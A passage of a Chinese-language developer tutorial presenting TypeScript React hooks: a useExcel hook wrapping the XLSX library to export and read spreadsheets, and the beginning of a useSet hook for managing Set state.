      <span class="hljs-keyword">const</span> ws = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">json_to_sheet</span>([])
      <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">book_append_sheet</span>(wb, ws)
    }

    <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">writeFile</span>(wb, <span class="hljs-string">`<span class="hljs-subst">${name}</span>.<span class="hljs-subst">${bookType}</span>`</span>, { bookType })
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 二维数组导出Excel文件
   *
   * 此函数将一个二维数组转换为Excel文件并下载
   * 支持单元格合并、列属性和行属性
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">any[][]</span>} <span class="hljs-variable">aoas</span> - 要导出的二维数组
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">IExportConfig</span>} <span class="hljs-variable">config</span> - 导出配置项
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} [config.name='导出'] - 导出文件名称
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">BookType</span>} [config.bookType='xlsx'] - 导出文件类型
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} [config.sheetName='Sheet1'] - 工作表名称
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Range[]</span>} [config.merges] - 单元格合并范围
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">ColInfo[]</span>} [config.colInfo] - 列属性配置
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">RowInfo[]</span>} [config.rowInfo] - 行属性配置
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">void</span>}
   */</span>
  <span class="hljs-keyword">function</span> exportAoa2Excel&lt;T = <span class="hljs-built_in">any</span>&gt;(<span class="hljs-attr">aoas</span>: T[][], config?: <span class="hljs-title class_">IExportConfig</span>) {
    <span class="hljs-keyword">const</span> {
      name = <span class="hljs-string">'导出'</span>,
      sheetName = <span class="hljs-string">'Sheet1'</span>,
      bookType = <span class="hljs-string">'xlsx'</span>,
      merges,
      colInfo,
      rowInfo,
    } = config || {}

    <span class="hljs-keyword">const</span> wb = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">book_new</span>()
    <span class="hljs-keyword">const</span> ws = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">aoa_to_sheet</span>(aoas)
    <span class="hljs-keyword">if</span> (merges) {
      ws[<span class="hljs-string">'!merges'</span>] = merges
    }
    <span class="hljs-keyword">if</span> (colInfo) {
      ws[<span class="hljs-string">'!cols'</span>] = colInfo
    }
    <span class="hljs-keyword">if</span> (rowInfo) {
      ws[<span class="hljs-string">'!rows'</span>] = rowInfo
    }

    <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">book_append_sheet</span>(wb, ws, sheetName)
    <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">writeFile</span>(wb, <span class="hljs-string">`<span class="hljs-subst">${name}</span>.<span class="hljs-subst">${bookType}</span>`</span>, { bookType })
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 从本地文件读取Excel工作簿
   *
   * 此函数从File或Blob对象读取Excel文件并返回工作簿对象
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">File | Blob</span>} <span class="hljs-variable">file</span> - 要读取的Excel文件
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Promise&lt;WorkBook | false&gt;</span>} 返回工作簿对象或false（读取失败时）
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">readWorkbookFromLocalFile</span>(<span class="hljs-params">
    file: File | Blob,
  </span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">WorkBook</span> | <span class="hljs-literal">false</span>&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>()
      reader.<span class="hljs-title function_">readAsBinaryString</span>(file)
      reader.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) {
        <span class="hljs-keyword">const</span> data = (e.<span class="hljs-property">target</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)?.<span class="hljs-property">result</span>
        <span class="hljs-keyword">const</span> workbook = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">read</span>(data, {
          <span class="hljs-attr">type</span>: <span class="hljs-string">'binary'</span>,
          <span class="hljs-attr">raw</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">cellNF</span>: <span class="hljs-literal">true</span>,
        })
        <span class="hljs-title function_">resolve</span>(workbook)
      }
      reader.<span class="hljs-property">onerror</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
        <span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>)
      }
    })
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 从本地Excel文件读取数据为JSON格式
   *
   * 此函数从File或Blob对象读取Excel文件并返回第一个工作表的数据为JSON数组
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">File | Blob</span>} <span class="hljs-variable">file</span> - 要读取的Excel文件
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Sheet2JSONOpts</span>} [options] - 工作表转JSON的选项
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Promise&lt;any[] | false&gt;</span>} 返回JSON数组或false（读取失败时）
   */</span>
  <span class="hljs-keyword">function</span> readFileToJson&lt;T = <span class="hljs-built_in">any</span>&gt;(
    <span class="hljs-attr">file</span>: <span class="hljs-title class_">File</span> | <span class="hljs-title class_">Blob</span>,
    options?: <span class="hljs-title class_">Sheet2JSONOpts</span>,
  ): <span class="hljs-title class_">Promise</span>&lt;T[] | <span class="hljs-literal">false</span>&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>()
      reader.<span class="hljs-title function_">readAsBinaryString</span>(file)
      reader.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) {
        <span class="hljs-keyword">const</span> data = (e.<span class="hljs-property">target</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)?.<span class="hljs-property">result</span>
        <span class="hljs-keyword">const</span> workbook = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">read</span>(data, {
          <span class="hljs-attr">type</span>: <span class="hljs-string">'binary'</span>,
          <span class="hljs-attr">raw</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">cellNF</span>: <span class="hljs-literal">true</span>,
        })
        <span class="hljs-keyword">const</span> json = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-property">sheet_to_json</span>&lt;T&gt;(
          workbook.<span class="hljs-property">Sheets</span>[workbook.<span class="hljs-property">SheetNames</span>[<span class="hljs-number">0</span>]],
          options,
        )
        <span class="hljs-title function_">resolve</span>(json)
      }
      reader.<span class="hljs-property">onerror</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
        <span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>)
      }
    })
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 从本地Excel文件读取多个工作表的数据为JSON格式
   *
   * 此函数从File或Blob对象读取Excel文件并返回所有工作表的数据为JSON对象
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">File | Blob</span>} <span class="hljs-variable">file</span> - 要读取的Excel文件
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Sheet2JSONOpts</span>} [options] - 工作表转JSON的选项
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Promise&lt;Record&lt;string, any[]&gt; | false&gt;</span>} 返回包含所有工作表数据的对象或false（读取失败时）
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">readFileToJsons</span>(<span class="hljs-params">
    file: File | Blob,
    options?: Sheet2JSONOpts,
  </span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>[]&gt; | <span class="hljs-literal">false</span>&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>()
      reader.<span class="hljs-title function_">readAsBinaryString</span>(file)
      reader.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) {
        <span class="hljs-keyword">const</span> data = e.<span class="hljs-property">target</span>?.<span class="hljs-property">result</span>
        <span class="hljs-keyword">const</span> workbook = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">read</span>(data, {
          <span class="hljs-attr">type</span>: <span class="hljs-string">'binary'</span>,
          <span class="hljs-attr">raw</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">cellNF</span>: <span class="hljs-literal">true</span>,
        })

        <span class="hljs-keyword">const</span> sheetNames = workbook.<span class="hljs-property">SheetNames</span>
        <span class="hljs-keyword">if</span> (!sheetNames?.<span class="hljs-property">length</span>) {
          <span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>)
        }

        <span class="hljs-keyword">const</span> jsons = sheetNames.<span class="hljs-title function_">reduce</span>(
          <span class="hljs-function">(<span class="hljs-params">pre: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>[]&gt;, cur: <span class="hljs-built_in">string</span></span>) =&gt;</span> {
            <span class="hljs-keyword">const</span> json = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">sheet_to_json</span>(workbook.<span class="hljs-property">Sheets</span>[cur], options)
            pre[cur] = json
            <span class="hljs-keyword">return</span> pre
          },
          {},
        )

        <span class="hljs-title function_">resolve</span>(jsons)
      }
      reader.<span class="hljs-property">onerror</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
        <span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>)
      }
    })
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 文件流导出Excel文件
   *
   * 此函数从File或Blob对象读取Excel文件流并导出为Excel文件
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">File | Blob</span>} <span class="hljs-variable">file</span> - 要导出的Excel文件流
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">IExportConfig</span>} <span class="hljs-variable">config</span> - 导出配置项
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} [config.name='导出'] - 导出文件名称
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">BookType</span>} [config.bookType='xlsx'] - 导出文件类型
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} [config.errorMsg='下载失败'] - 错误提示信息
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Promise&lt;void&gt;</span>}
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">exportBuffer2Excel</span>(<span class="hljs-params">file: File | Blob, config?: IExportConfig</span>) {
    <span class="hljs-keyword">const</span> {
      name = <span class="hljs-string">'导出'</span>,
      bookType = <span class="hljs-string">'xlsx'</span>,
      errorMsg = <span class="hljs-string">'下载失败'</span>,
    } = config || {}
    <span class="hljs-keyword">const</span> <span class="hljs-attr">wb</span>: <span class="hljs-title class_">WorkBook</span> | <span class="hljs-literal">false</span> = <span class="hljs-keyword">await</span> <span class="hljs-title function_">readWorkbookFromLocalFile</span>(file)
    <span class="hljs-keyword">if</span> (wb) {
      <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">writeFile</span>(wb, <span class="hljs-string">`<span class="hljs-subst">${name}</span>.<span class="hljs-subst">${bookType}</span>`</span>, { bookType })
    } <span class="hljs-keyword">else</span> {
      message.<span class="hljs-title function_">error</span>(errorMsg)
    }
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 从URL导出Excel文件
   *
   * 此函数从URL获取Excel文件并导出
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} <span class="hljs-variable">url</span> - Excel文件的URL地址
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">IExportConfig</span>} <span class="hljs-variable">config</span> - 导出配置项
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} [config.name='导出'] - 导出文件名称
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">BookType</span>} [config.bookType='xlsx'] - 导出文件类型
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} [config.errorMsg='下载失败'] - 错误提示信息
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Promise&lt;void&gt;</span>}
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">exportUrl2Excel</span>(<span class="hljs-params">url: <span class="hljs-built_in">string</span>, config?: IExportConfig</span>) {
    <span class="hljs-title function_">fetch</span>(url)
      .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> response.<span class="hljs-title function_">blob</span>())
      .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">blob</span>) =&gt;</span> {
        <span class="hljs-title function_">exportBuffer2Excel</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Blob</span>([blob]), config)
      })
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
        <span class="hljs-keyword">throw</span> error
      })
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 从工作表中读取指定列的数据
   *
   * 此函数从Excel文件的指定工作表中读取指定列的数据
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">File | Blob</span>} <span class="hljs-variable">file</span> - Excel文件
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} [sheetIndex=0] - 工作表索引
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string[]</span>} [columns=['A']] - 要读取的列数组（如['A', 'B']）
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Record&lt;string, string&gt;</span>} [fieldsMap={}] - 列名到字段名的映射
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Promise&lt;any[] | false&gt;</span>} 返回包含指定列数据的数组或false（读取失败时）
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">readColumnFromSheet</span>(<span class="hljs-params">
    file: File | Blob,
    sheetIndex: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>,
    columns: <span class="hljs-built_in">string</span>[] = [<span class="hljs-string">'A'</span>],
    fieldsMap: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; = {},
  </span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">any</span>[] | <span class="hljs-literal">false</span>&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>()
      reader.<span class="hljs-title function_">readAsBinaryString</span>(file)
      reader.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) {
        <span class="hljs-keyword">const</span> data = (e.<span class="hljs-property">target</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)?.<span class="hljs-property">result</span>
        <span class="hljs-keyword">const</span> workbook = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">read</span>(data, {
          <span class="hljs-attr">type</span>: <span class="hljs-string">'binary'</span>,
          <span class="hljs-attr">raw</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">cellNF</span>: <span class="hljs-literal">true</span>,
        })

        <span class="hljs-keyword">const</span> sheetName = workbook.<span class="hljs-property">SheetNames</span>[sheetIndex]
        <span class="hljs-keyword">const</span> worksheet = workbook.<span class="hljs-property">Sheets</span>[sheetName]

        <span class="hljs-comment">// 获取 A 列的所有数据，跳过第一行（标题行）</span>
        <span class="hljs-keyword">const</span> columnData = []
        <span class="hljs-keyword">const</span> range = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">decode_range</span>(worksheet[<span class="hljs-string">'!ref'</span>] <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>)

        <span class="hljs-comment">// 从第2行开始（索引为1，跳过标题行）</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> row = range.<span class="hljs-property">s</span>.<span class="hljs-property">r</span> + <span class="hljs-number">1</span>; row &lt;= range.<span class="hljs-property">e</span>.<span class="hljs-property">r</span>; row++) {
          <span class="hljs-keyword">const</span> <span class="hljs-attr">res</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt; = {}
          columns.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">col: <span class="hljs-built_in">string</span></span>) =&gt;</span> {
            <span class="hljs-keyword">const</span> columnIndex = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">decode_col</span>(col) <span class="hljs-comment">// 将列字母转换为索引</span>
            <span class="hljs-keyword">const</span> cellAddress = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">encode_cell</span>({
              <span class="hljs-attr">r</span>: row,
              <span class="hljs-attr">c</span>: columnIndex,
            }) <span class="hljs-comment">// A列是第0列</span>
            <span class="hljs-keyword">const</span> cell = worksheet[cellAddress]
            <span class="hljs-keyword">const</span> field = fieldsMap[col] ?? col
            res[field] = cell ? cell.<span class="hljs-property">v</span> : <span class="hljs-string">''</span>
          })
          columnData.<span class="hljs-title function_">push</span>(res)
        }

        <span class="hljs-title function_">resolve</span>(columnData)
      }
      reader.<span class="hljs-property">onerror</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
        <span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>)
      }
    })
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 从工作表中获取指定列的数据
   *
   * 此函数从Excel工作表中获取指定列的所有数据（跳过标题行）
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">XLSX.WorkSheet</span>} <span class="hljs-variable">worksheet</span> - Excel工作表对象
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} <span class="hljs-variable">column</span> - 要获取数据的列（如'A'、'B'）
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">any[]</span>} 返回指定列的数据数组
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">getColumnData</span>(<span class="hljs-params">worksheet: XLSX.WorkSheet, column: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-keyword">const</span> columnData = []
    <span class="hljs-keyword">const</span> range = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">decode_range</span>(worksheet[<span class="hljs-string">'!ref'</span>] <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>)
    <span class="hljs-keyword">const</span> columnIndex = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">decode_col</span>(column) <span class="hljs-comment">// 将列字母转换为索引</span>

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> row = range.<span class="hljs-property">s</span>.<span class="hljs-property">r</span> + <span class="hljs-number">1</span>; row &lt;= range.<span class="hljs-property">e</span>.<span class="hljs-property">r</span>; row++) {
      <span class="hljs-keyword">const</span> cellAddress = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">encode_cell</span>({ <span class="hljs-attr">r</span>: row, <span class="hljs-attr">c</span>: columnIndex })
      <span class="hljs-keyword">const</span> cell = worksheet[cellAddress]
      columnData.<span class="hljs-title function_">push</span>(cell ? cell.<span class="hljs-property">v</span> : <span class="hljs-literal">null</span>)
    }

    <span class="hljs-keyword">return</span> columnData
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 从本地文件读取Excel工作簿
   *
   * 此函数从File或Blob对象读取Excel文件并返回工作簿对象
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">File | Blob</span>} <span class="hljs-variable">file</span> - 要读取的Excel文件
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">XLSX.ParsingOptions</span>} [options] - 解析选项
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Promise&lt;WorkBook | false&gt;</span>} 返回工作簿对象或false（读取失败时）
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">readWorkbookFromFile</span>(<span class="hljs-params">
    file: File | Blob,
    options: XLSX.ParsingOptions = {
      <span class="hljs-keyword">type</span>: <span class="hljs-string">'binary'</span>,
      raw: <span class="hljs-literal">true</span>,
      cellNF: <span class="hljs-literal">true</span>,
    },
  </span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">WorkBook</span> | <span class="hljs-literal">false</span>&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>()
      reader.<span class="hljs-title function_">readAsBinaryString</span>(file)
      reader.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) {
        <span class="hljs-keyword">const</span> data = (e.<span class="hljs-property">target</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)?.<span class="hljs-property">result</span>
        <span class="hljs-keyword">const</span> workbook = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">read</span>(data, options)
        <span class="hljs-title function_">resolve</span>(workbook)
      }
    })
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 从URL读取Excel工作簿
   *
   * 此函数从URL读取Excel文件并返回工作簿对象
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} <span class="hljs-variable">url</span> - Excel文件的URL地址
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">XLSX.ParsingOptions</span>} [options] - 解析选项
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">WorkBook</span>} 返回工作簿对象
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">readWorkbookFromUrl</span>(<span class="hljs-params">
    url: <span class="hljs-built_in">string</span>,
    options: XLSX.ParsingOptions = {
      <span class="hljs-keyword">type</span>: <span class="hljs-string">'string'</span>,
      raw: <span class="hljs-literal">true</span>,
      cellNF: <span class="hljs-literal">true</span>,
    },
  </span>): <span class="hljs-title class_">WorkBook</span> {
    <span class="hljs-keyword">const</span> workbook = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">readFile</span>(url, options)
    <span class="hljs-keyword">return</span> workbook
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 从URL读取Excel工作簿
   *
   * 此函数从URL读取Excel文件并返回工作簿对象
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} <span class="hljs-variable">url</span> - Excel文件的URL地址
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">XLSX.ParsingOptions</span>} [options] - 解析选项
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">WorkBook</span>} 返回工作簿对象
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">readWorkbookFromUrl1</span>(<span class="hljs-params">url: <span class="hljs-built_in">string</span></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">WorkBook</span> | <span class="hljs-literal">false</span>&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url)
      <span class="hljs-keyword">const</span> blob = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">blob</span>()
      <span class="hljs-keyword">const</span> wb = <span class="hljs-title function_">readWorkbookFromFile</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Blob</span>([blob]))
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(wb)
    } <span class="hljs-keyword">catch</span>  {
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>)
    }
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 保存工作簿为Excel文件
   *
   * 此函数将工作簿对象保存为Excel文件
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">WorkBook</span>} <span class="hljs-variable">workbook</span> - 要保存的工作簿对象
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} <span class="hljs-variable">fileName</span> - 文件名
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">XLSX.WritingOptions</span>} [options] - 写入选项
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">void</span>}
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">saveWbToExcel</span>(<span class="hljs-params">
    workbook: WorkBook,
    fileName: <span class="hljs-built_in">string</span>,
    options?: XLSX.WritingOptions,
  </span>) {
    <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">writeFile</span>(workbook, fileName, options)
  }

  <span class="hljs-keyword">return</span> {
    exportJson2Excel,
    exportAoa2Excel,
    exportBuffer2Excel,
    exportJson2ExcelSheets,
    exportUrl2Excel,
    readWorkbookFromLocalFile,
    readFileToJson,
    readFileToJsons,
    readColumnFromSheet,
    getColumnData,
    readWorkbookFromFile,
    readWorkbookFromUrl,
    readWorkbookFromUrl1,
    saveWbToExcel,
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useExcel

<span class="hljs-comment">// 使用</span>
<span class="hljs-keyword">const</span> {
    exportJson2Excel,
    readFileToJson,
    readFileToJsons,
    readColumnFromSheet,
    readWorkbookFromUrl,
    readWorkbookFromUrl1,
    readWorkbookFromFile,
    saveWbToExcel,
  } = <span class="hljs-title function_">useExcel</span>()
</code></pre>
<h3 data-id="heading-3">useSet</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { useMemo, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// 定义操作方法的接口</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Actions</span>&lt;T&gt; {
  <span class="hljs-attr">add</span>: <span class="hljs-function">(<span class="hljs-params">key: T</span>) =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// 新增一条数据</span>
  <span class="hljs-attr">set</span>: <span class="hljs-function">(<span class="hljs-params">map: <span class="hljs-built_in">Set</span>&lt;T&gt;</span>) =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// 设置全部数据</span>
  <span class="hljs-attr">remove</span>: <span class="hljs-function">(<span class="hljs-params">key: T</span>) =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// 删除某条数据</span>
  <span class="hljs-attr">clear</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// 清空数据</span>
  <span class="hljs-attr">reset</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> <span class="hljs-comment">// 重置为默认值</span>
}

<span class="hljs-keyword">function</span> useSet&lt;T&gt;(<span class="hljs-attr">defaultValue</span>: <span class="hljs-title class_">Set</span>&lt;T&gt; = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()): [<span class="hljs-title class_">Set</span>&lt;T&gt;, <span class="hljs-title class_">Actions</span>&lt;T&gt;] {
  <span class="hljs-keyword">const</span> [sets, setSets] = useState&lt;<span class="hljs-title class_">Set</span>&lt;T&gt;&gt;(defaultValue)

  <span class="hljs-comment">// 缓存操作方法避免重复创建</span>
  <span class="hljs-keyword">const</span> actions = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 新增数据</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">add</span> = (<span class="hljs-params">value: T</span>) =&gt; {
      <span class="hljs-keyword">const</span> newSet = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(sets)
      newSet.<span class="hljs-title function_">add</span>(value)
      <span class="hljs-title function_">setSets</span>(newSet)
    }

    <span class="hljs-comment">// 设置全部数据</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">set</span> = (<span class="hljs-params">sets: <span class="hljs-built_in">Set</span>&lt;T&gt;</span>) =&gt; {
      <span class="hljs-title function_">setSets</span>(sets)
    }

    <span class="hljs-comment">// 删除数据</span>
